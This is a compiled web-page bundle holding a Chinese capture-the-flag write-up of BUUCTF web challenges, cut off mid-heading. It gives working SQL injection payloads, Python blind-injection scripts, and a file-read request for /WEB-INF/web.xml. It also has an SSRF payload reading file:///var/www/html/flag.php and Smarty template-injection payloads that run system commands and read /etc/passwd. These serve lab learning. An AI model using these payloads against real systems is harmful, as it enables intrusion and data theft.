"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[3286],{28453:(n,e,r)=>{r.d(e,{R:()=>l,x:()=>a});var s=r(96540);const i={},c=s.createContext(i);function l(n){const e=s.useContext(c);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:l(n.components),s.createElement(c.Provider,{value:e},n.children)}},87775:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>t,contentTitle:()=>a,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"CTF/BUUCTF/BUUCTF-web-1","title":"BUUCTF-web-1","description":"[GXYCTF2019]BabySQli","source":"@site/docs/CTF/BUUCTF/BUUCTF-web-1.md","sourceDirName":"CTF/BUUCTF","slug":"/CTF/BUUCTF/BUUCTF-web-1","permalink":"/docs/CTF/BUUCTF/BUUCTF-web-1","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/BUUCTF/BUUCTF-web-1.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"BUUCTF","permalink":"/docs/category/buuctf"},"next":{"title":"BUUCTF-web-2","permalink":"/docs/CTF/BUUCTF/BUUCTF-web-2"}}');var i=r(74848),c=r(28453);const l={},a=void 0,t={},d=[{value:"[GXYCTF2019]BabySQli",id:"gxyctf2019babysqli",level:2},{value:"[GYCTF2020]Blacklist",id:"gyctf2020blacklist",level:2},{value:"[CISCN2019 \u534e\u5317\u8d5b\u533a Day2 Web1]Hack World",id:"ciscn2019-\u534e\u5317\u8d5b\u533a-day2-web1hack-world",level:2},{value:"[RoarCTF 2019]Easy Java",id:"roarctf-2019easy-java",level:2},{value:"[\u7f51\u9f0e\u676f 2018]Fakebook",id:"\u7f51\u9f0e\u676f-2018fakebook",level:2},{value:"[BJDCTF2020]The mystery of ip",id:"bjdctf2020the-mystery-of-ip",level:2},{value:"[\u7f51\u9f0e\u676f 2020 \u6731\u96c0\u7ec4]phpweb",id:"\u7f51\u9f0e\u676f-2020-\u6731\u96c0\u7ec4phpweb",level:2},{value:"[BSidesCF 2020]Had a bad day",id:"bsidescf-2020had-a-bad-day",level:2},{value:"[BJDCTF2020]ZJCTF\uff0c\u4e0d\u8fc7\u5982\u6b64",id:"bjdctf2020zjctf\u4e0d\u8fc7\u5982\u6b64",level:2},{value:"[BUUCTF 2018]Online Tool",id:"buuctf-2018online-tool",level:2},{value:"[GXYCTF2019]\u7981\u6b62\u5957\u5a03",id:"gxyctf2019\u7981\u6b62\u5957\u5a03",level:2},{value:"[NCTF2019]Fake XML cookbook",id:"nctf2019fake-xml-cookbook",level:2},{value:"[GWCTF 2019]\u6211\u6709\u4e00\u4e2a\u6570\u636e\u5e93",id:"gwctf-2019\u6211\u6709\u4e00\u4e2a\u6570\u636e\u5e93",level:2},{value:"[WUSTCTF2020]\u6734\u5b9e\u65e0\u534e",id:"wustctf2020\u6734\u5b9e\u65e0\u534e",level:2},{value:"[BJDCTF2020]Cookie is so stable",id:"bjdctf2020cookie-is-so-stable",level:2},{value:"[\u5b89\u6d35\u676f 2019]easy_web",id:"\u5b89\u6d35\u676f-2019easy_web",level:2},{value:"[MRCTF2020]Ezpop",id:"mrctf2020ezpop",level:2},{value:"[\u5f3a\u7f51\u676f 2019]\u9ad8\u660e\u7684\u9ed1\u5ba2",id:"\u5f3a\u7f51\u676f-2019\u9ad8\u660e\u7684\u9ed1\u5ba2",level:2},{value:"[\u5b89\u6d35\u676f 2019]easy_serialize_php",id:"\u5b89\u6d35\u676f-2019easy_serialize_php",level:2},{value:"[MRCTF2020]PYWebsite",id:"mrctf2020pywebsite",level:2},{value:"[WesternCTF2018]shrine",id:"westernctf2018shrine",level:2}];function p(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,c.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:"gxyctf2019babysqli",children:"[GXYCTF2019]BabySQli"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:"\u77e5\u8bc6\u70b9"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u5728mysql\u4e2d\uff0c\u8fdb\u884c\u8054\u5408\u67e5\u8be2\u65f6\uff0c\u5982\u679c\u6570\u636e\u4e0d\u5b58\u5728\uff0c\u8054\u5408\u67e5\u8be2\u5c31\u4f1a\u6784\u9020\u4e00\u4e2a\u865a\u62df\u7684\u6570\u636e"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u73b0\u5728\u6709\u4e00\u4e2a\u8868\uff0c\u8868\u91cc\u6709\u4ee5\u4e0b\u6570\u636e"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202180037559.png",alt:"image-20240202180037559"})}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u6267\u884csql\u8bed\u53e5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-sql",children:"select * from test where username = '1' union select 0,'admin',\"12345\";\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6570\u636e\u5c31\u88ab\u7be1\u6539\u4e86"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202180300916.png",alt:"image-20240202180300916"})}),"\n",(0,i.jsx)(e.p,{children:"\u5728\u8fd9\u91cc\uff0c\u8868\u91cc\u7684\u5bc6\u7801\u662f\u8fdb\u884cMD5\u52a0\u5bc6\u7684\uff0c\u6240\u4ee5payload\u662f"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"name='union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#\r\npw=123456\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-http",children:'POST /search.php HTTP/1.1\r\nHost: 241ef65a-73aa-49ca-afad-1b7400e11aef.node5.buuoj.cn:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://241ef65a-73aa-49ca-afad-1b7400e11aef.node5.buuoj.cn:81/search.php\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 77\r\nOrigin: http://241ef65a-73aa-49ca-afad-1b7400e11aef.node5.buuoj.cn:81\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\nname=\' union select 1,"admin","e10adc3949ba59abbe56e057f20f883e"--+&pw=123456\n'})}),"\n",(0,i.jsx)(e.h2,{id:"gyctf2020blacklist",children:"[GYCTF2020]Blacklist"}),"\n",(0,i.jsx)(e.p,{children:"\u6839\u636e\u56de\u663e\uff0c\u77e5\u9053\u8fc7\u6ee4\u4e86\u5f88\u591a\u5173\u952e\u5b57"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'return                     preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i",$inject);\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91ccshow\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u8fdb\u884c\u5806\u53e0\u6ce8\u5165"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:"payload"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"1';show tables;\r\n1';show columns from FlagHere;\r\n1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u4f7f\u7528handler .... open\u8bed\u53e5\u8fdb\u884c\u67e5\u8be2\uff0c\u6709\u4e0b\u9762\u7684\u7528\u6cd5"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u4f8b\u5982,\u73b0\u5728\u5df2\u77e5\u4e00\u5f20\u8868\u540d\u4e3atablename\uff1a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"handler tablename open;\r\nhandler tablename read frist;\r\nhandler tablename close;\r\n\r\n\u6216\u8005\uff1a\r\n\r\nhandler  tablename open as test;\r\nhandler test read frist;\r\nhandler test close;\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"handler tablename read first; \u8bfb\u53d6tablename\u8868\u7684\u7b2c\u4e00\u884c\u4fe1\u606f\u3002\r\nhandler tablename read next;   \u8bfb\u53d6tablename\u8868\u7684\u4e0b\u4e00\u884c\u4fe1\u606f\u3002\r\nhandler tablename read first limit 0,2; \u8bfb\u53d6tablename\u8868\u7684\u524d\u4e24\u884c\u4fe1\u606f\u3002\n"})}),"\n"]}),"\n",(0,i.jsx)(e.h2,{id:"ciscn2019-\u534e\u5317\u8d5b\u533a-day2-web1hack-world",children:"[CISCN2019 \u534e\u5317\u8d5b\u533a Day2 Web1]Hack World"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://www.jianshu.com/p/a98b1b9d3265",children:"\u94fe\u63a5"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202201345772.png",alt:"image-20240202201345772"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd4\u56de\u7684\u662fid=2\u65f6\u7684\u7ed3\u679c"}),"\n",(0,i.jsx)(e.p,{children:"\u5224\u65ad\u4e3a\u6570\u5b57\u578b\u6ce8\u5165\uff0c\u4f46\u662f\u8fc7\u6ee4\u4e86\u5f88\u591a\uff08union\uff0cand\uff0cor\uff0c\u7a7a\u683c\u7b49\uff09"}),"\n",(0,i.jsxs)(e.p,{children:["\u7a7a\u683c\u53ef\u4ee5\u5229\u7528",(0,i.jsx)(e.code,{children:"/**/"}),"\u6216\u5706\u62ec\u53f7\u4ee3\u66ff"]}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\u6ca1\u6709\u8fc7\u6ee4\u5706\u62ec\u53f7"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"if\u8bed\u53e5\u91cc\u9762\u6709\u4e09\u4e2a\u53c2\u6570"}),"\n",(0,i.jsx)(e.p,{children:"if(a,b,c)"}),"\n",(0,i.jsx)(e.p,{children:"\u5982\u679ca\u7684\u7ed3\u679c\u662ftrue\uff0c\u90a3\u4e48\u5c31\u8fd4\u56deb\uff0c\u53e6\u5c31\u8fd4\u56dec"}),"\n",(0,i.jsx)(e.p,{children:"\u7c7b\u4f3c\u4e09\u76ee\u8fd0\u7b97\u7b26"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"id=if(1,2,1) \u8fd9\u91cc\u56de\u663e2\u65f6\u7684\u7ed3\u679c\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:"\u90a3\u4e48\u8fd9\u9898\u53ef\u4ee5\u5229\u7528\u5e03\u5c14\u76f2\u6ce8"})}),"\n",(0,i.jsx)(e.p,{children:"\u63a5\u7740\u6784\u9020"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"id=if(mid((select(flag)from(flag)),1,1)='f',2,1) \u6d4b\u8bd5flag\u7b2c\u4e00\u4f4d\u662f\u4e0d\u662ff\u5b57\u6bcd\uff0c\u8fd4\u56detrue\r\n\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5199python\u4ee3\u7801\u5b9e\u73b0\u8bfb\u53d6flag"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-python",children:'import requests\r\n\r\n\r\nurl = "http://8622ee8e-2bad-4861-8340-9681a37cc067.node5.buuoj.cn:81/index.php"\r\nstring = ""\r\nfor i in range(1,45):\r\n    str1 = "qwertyuiopasdfghjklzxcvbnm0123456789{}"\r\n    for j in str1:\r\n        sql = f"if(mid((select(flag)from(flag)),{i},1)=\'{j}\',2,1)"\r\n        # print(sql)\r\n        data = {\r\n            "id": sql\r\n        }\r\n        response = requests.post(url,data=data)\r\n        if "Do you" in response.text:\r\n            print(j)\r\n            string = string + j\r\n\r\nprint(string)\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u4e8c\u5206\u76f2\u6ce8\u6cd5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-python",children:'import requests\r\n\r\n\r\nurl = "http://8622ee8e-2bad-4861-8340-9681a37cc067.node5.buuoj.cn:81/index.php"\r\nstring = []\r\nfor i in range(50):\r\n    l, r, mid = 32, 127, (32+127)//2\r\n    while l < r:\r\n        sql = f"if(ascii(mid((select(flag)from(flag)),{i},1))>{mid},2,1)"\r\n        data = {\r\n            "id": sql\r\n        }\r\n        response = requests.post(url, data)\r\n        if "Do you" in response.text:\r\n            print(chr(mid))\r\n            l = mid + 1\r\n        else:\r\n            r = mid\r\n        mid = (l + r) // 2\r\n    string.append(chr(int(mid)))\r\n\r\nprint("".join(string))\n'})}),"\n",(0,i.jsx)(e.h2,{id:"roarctf-2019easy-java",children:"[RoarCTF 2019]Easy Java"}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u662f\u4e00\u9053java\u9898\u76ee\uff0c\u5229\u7528\u4e86\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u70b9\u51fbhelp\uff0c\u53d1\u73b0\u6709\u4e00\u4e2ahelp.docx\u6587\u4ef6\uff0c\u5c1d\u8bd5\u8fdb\u884c\u4e0b\u8f7d\u3002"}),"\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u7528\u6237\u540d\u548c\u5bc6\u7801\u90fd\u662f\u901a\u8fc7post\u4f20\u9012\u7684\uff0c\u5c1d\u8bd5post\u8bfb\u53d6\u6587\u4ef6"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u4e0b\u8f7d\u4e0b\u6765\u6587\u4ef6\u91cc\u6ca1\u6709flag"}),"\n",(0,i.jsx)(e.p,{children:"\u5c1d\u8bd5\u8bfb\u53d6web.xml\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"filename=/WEB-INF/web.xml\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202203633477.png",alt:"image-20240202203633477"})}),"\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u548cflag\u6709\u5173\u7684\u7c7b\uff0c\u8fdb\u884c\u8bfb\u53d6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"filename=/WEB-INF/classes/com/wm/ctf/FlagController.class\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202203842824.png",alt:"image-20240202203842824"})}),"\n",(0,i.jsx)(e.p,{children:"\u6587\u4ef6\u91cc\u53d1\u73b0flag\uff0c\u8fdb\u884cbase\u89e3\u7801\uff0c\u5f97\u5230flag"}),"\n",(0,i.jsx)(e.h2,{id:"\u7f51\u9f0e\u676f-2018fakebook",children:"[\u7f51\u9f0e\u676f 2018]Fakebook"}),"\n",(0,i.jsx)(e.p,{children:"\u8003\u70b9\uff1asql\u6570\u5b57\u578b\u6ce8\u5165\uff0cphp\u5e8f\u5217\u5316\uff0cfile\u534f\u8bae,\u722c\u866b\u534f\u8bae\uff0c\u6e90\u7801\u5907\u4efd\uff0cSSRF"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u5728view.php\u4e2d\u53d1\u73b0\u6570\u5b57\u578b\u6ce8\u5165"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"no=1 or 1=1 \u56de\u663e\u6210\u529f\r\nno=1 or 1=2 \u62a5\u9519\n"})}),"\n"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u8fdb\u884c\u8bfb\u53d6\u6570\u636e\u5e93\u6570\u636e"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u6d4b\u8bd5\u5b57\u6bb5\u6570"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"no=-1 order by 1,2,3,4# \u4e00\u5171\u56db\u4e2a\u5b57\u6bb5\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u8bfb\u53d6\u6570\u636e\u5e93\u540d\uff08\u8fd9\u91cc",(0,i.jsx)(e.code,{children:"union select"}),"\u6574\u4f53\u88ab\u8fc7\u6ee4\u4e86\uff09"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"-1 union/**/select 1,2,3,4\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u89c2\u5bdf\u9875\u9762\uff0c\u53d1\u73b0\u53ea\u67092\u4f4d\u7f6e\u6709\u56de\u663e\uff0c\u63a5\u7740\u5199\u8bed\u53e5"}),"\n",(0,i.jsx)(e.p,{children:"\u7206\u5f53\u524d\u6570\u636e\u5e93"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"-1 union/**/select 1,database(),3,4\r\nfakebook\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u7206\u8868\u540d"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'\r\nusers\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u7206\u5b57\u6bb5\u540d"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"-1 union/**/select 1,group_concat(column_name) ,3,4 from information_schema.columns where table_name='users'\r\nno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u67e5\u770b\u5b57\u6bb5\u7684\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"-1 union/**/select 1,group_concat(no,';',username,';',passwd,';',data)  ,3,4 from users\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'1;11;74a49c698dbd3c12e36b0b287447d833f74f3937ff132ebff7054baa18623c35a705bb18b82e2ac0384b5127db97016e63609f712bc90e3506cfbea97599f46f;O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:9:"baidu.com";}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91ccdata\u7684\u503c\u662f\u5e8f\u5217\u5316\u5b57\u7b26\u4e32"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u7f51\u7ad9\u76ee\u5f55\u4e0b\u8fd8\u6709robots.txt"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"User-agent: *\r\nDisallow: /user.php.bak\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8bbf\u95ee/user.php.bak\uff0c\u4e0b\u8f7d\u6e90\u7801"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\n\r\n\r\nclass UserInfo\r\n{\r\n    public $name = "";\r\n    public $age = 0;\r\n    public $blog = "";\r\n\r\n    public function __construct($name, $age, $blog)\r\n    {\r\n        $this->name = $name;\r\n        $this->age = (int)$age;\r\n        $this->blog = $blog;\r\n    }\r\n\r\n    function get($url)\r\n    {\r\n        $ch = curl_init();\r\n\r\n        curl_setopt($ch, CURLOPT_URL, $url);\r\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n        $output = curl_exec($ch);\r\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\r\n        if($httpCode == 404) {\r\n            return 404;\r\n        }\r\n        curl_close($ch);\r\n\r\n        return $output;\r\n    }\r\n\r\n    public function getBlogContents ()\r\n    {\r\n        return $this->get($this->blog);\r\n    }\r\n\r\n    public function isValidBlog ()\r\n    {\r\n        $blog = $this->blog;\r\n        return preg_match("/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i", $blog);\r\n    }\r\n\r\n}\n'})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u901a\u8fc7get\u83b7\u5f97\u6307\u5b9a\u7684URL\uff0c\u8bbe\u7f6ecurl \u53c2\u6570\uff0c\u5e76\u5c06\u6307\u5b9aURL\u7684\u5185\u5bb9\u8fd4\u56de\uff0c\u53ea\u8981\u8fd4\u56de\u5185\u5bb9\u4e0d\u4e3a404\u5373\u53ef"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u6700\u540e\u7684payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'no=-1 union/**/select 1,2,3,\'O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:29:"file:///var/www/html/flag.php";}\'\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528SSRF\u6f0f\u6d1e\u548cfile\u534f\u8bae\uff0c\u8fd4\u56deflag.php\u7684\u5185\u5bb9"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202220349663.png",alt:"image-20240202220349663"})}),"\n",(0,i.jsx)(e.p,{children:"base64\u89e3\u7801\u5373\u53ef"}),"\n",(0,i.jsx)(e.h2,{id:"bjdctf2020the-mystery-of-ip",children:"[BJDCTF2020]The mystery of ip"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"SSTI\uff08Server-Side Template Injection\uff09\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165\u4e3b\u8981\u662f Python \u7684\u4e00\u4e9b\u6846\u67b6\uff0c\u5982  jinja2\u3001mako\u3001tornado\u3001django\uff0cPHP \u6846\u67b6 smarty\u3001twig\uff0cJava \u6846\u67b6 jade\u3001velocity  \u7b49\u7b49\u4f7f\u7528\u6e32\u67d3\u51fd\u6570\u65f6\uff0c\u7531\u4e8e\u4ee3\u7801\u4e0d\u89c4\u8303\u6216\u4fe1\u4efb\u4e86\u7528\u6237\u8f93\u5165\u800c\u5bfc\u81f4\u4e86\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165\uff0c\u6a21\u677f\u6e32\u67d3\u5176\u5b9e\u5e76\u6ca1\u6709\u6f0f\u6d1e\uff0c\u4e3b\u8981\u662f\u7a0b\u5e8f\u5458\u5bf9\u4ee3\u7801\u4e0d\u89c4\u8303\u4e0d\u4e25\u8c28\u9020\u6210\u4e86\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\uff0c\u9020\u6210\u6a21\u677f\u53ef\u63a7"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/2916285-20220817093258173-1632680559.png",alt:"2916285-20220817093258173-1632680559"})}),"\n",(0,i.jsx)(e.p,{children:"\u67e5\u770bhint.php"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240203203551765.png",alt:"image-20240203203551765"})}),"\n",(0,i.jsx)(e.p,{children:"\u731c\u6d4b\u548cXFF\u6709\u5173"}),"\n",(0,i.jsx)(e.p,{children:"\u6784\u9020\u8bed\u53e5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"X-Forwarded-For: 127.0.0.1\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u9875\u9762\u4e5f\u53d8\u4e86\uff0c\u731c\u6d4b\u5b58\u5728ssti\u6ce8\u5165"}),"\n",(0,i.jsx)(e.p,{children:"\u6839\u636e\u4e0a\u9762\u7684\u56fe\u8fdb\u884c\u6d4b\u8bd5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u9996\u5148\u6d4b\u8bd5\r\nX-Forwarded-For: ${7*7} \u56de\u663e\u4e86 $49\r\n\u63a5\u7740\u6784\u9020\u6210 a{*comment*}b \u56de\u663e\u4e86 ab \u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u662fSmarty\u6a21\u677f\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:"Smarty\u7684\u4e00\u4e9b\u5e38\u89c4\u5229\u7528\u7684\u65b9\u5f0f"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.ol,{children:["\n",(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:"{$smarty.version}"})}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"{$smarty.version}  #\u83b7\u53d6smarty\u7684\u7248\u672c\u53f7\n"})}),"\n",(0,i.jsxs)(e.ol,{start:"2",children:["\n",(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:"{php}{/php}"})}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"{php}phpinfo();{/php}  #\u6267\u884c\u76f8\u5e94\u7684php\u4ee3\u7801\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u56e0\u4e3a\u5728Smarty3\u7248\u672c\u4e2d\u5df2\u7ecf\u5e9f\u5f03",(0,i.jsx)(e.code,{children:"{php}"}),"\u6807\u7b7e\uff0c\u5f3a\u70c8\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u3002\u5728Smarty 3.1\uff0c",(0,i.jsx)(e.code,{children:"{php}"}),"\u4ec5\u5728SmartyBC\u4e2d\u53ef\u7528\r\n3. ",(0,i.jsx)(e.code,{children:"{literal}"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-js",children:'<script language="php">phpinfo();<\/script>\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u8fd9\u79cd\u5199\u6cd5\u53ea\u9002\u7528\u4e8e",(0,i.jsx)(e.code,{children:"php5"}),"\u73af\u5883\r\n4. getstreamvariable"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'{self::getStreamVariable("file:///etc/passwd")}\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u57283.1.30\u7684Smarty\u7248\u672c\u4e2d\u5b98\u65b9\u5df2\u7ecf\u628a\u8be5\u9759\u6001\u65b9\u6cd5\u5220\u9664\r\n5. ",(0,i.jsx)(e.code,{children:"{if}{/if}"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"{if phpinfo()}{/if}\n"})}),"\n",(0,i.jsxs)(e.p,{children:["Smarty\u7684",(0,i.jsx)(e.code,{children:"{if}"}),"\u6761\u4ef6\u5224\u65ad\u548cPHP\u7684if\u975e\u5e38\u76f8\u4f3c\uff0c\u53ea\u662f\u589e\u52a0\u4e86\u4e00\u4e9b\u7279\u6027\u3002",(0,i.jsx)(e.code,{children:"\u6bcf\u4e2a{if}\u5fc5\u987b\u6709\u4e00\u4e2a\u914d\u5bf9\u7684{/if}"}),"\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528",(0,i.jsx)(e.code,{children:"{else} \u548c {elseif}"}),"\uff0c\u5168\u90e8\u7684PHP\u6761\u4ef6\u8868\u8fbe\u5f0f\u548c\u51fd\u6570\u90fd\u53ef\u4ee5\u5728if\u5185\u4f7f\u7528\uff0c\u5982",(0,i.jsx)(e.code,{children:"||\uff0cor\uff0c&&\uff0cand\uff0cis_array()"}),"\u7b49\u7b49\uff0c\u5982\uff1a",(0,i.jsx)(e.code,{children:"{if is_array($array)}{/if}"})]}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u6700\u540e\u7684payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-http",children:'X-Forwarded-For: {if system("cat /flag")}{/if}\n'})}),"\n",(0,i.jsx)(e.h2,{id:"\u7f51\u9f0e\u676f-2020-\u6731\u96c0\u7ec4phpweb",children:"[\u7f51\u9f0e\u676f 2020 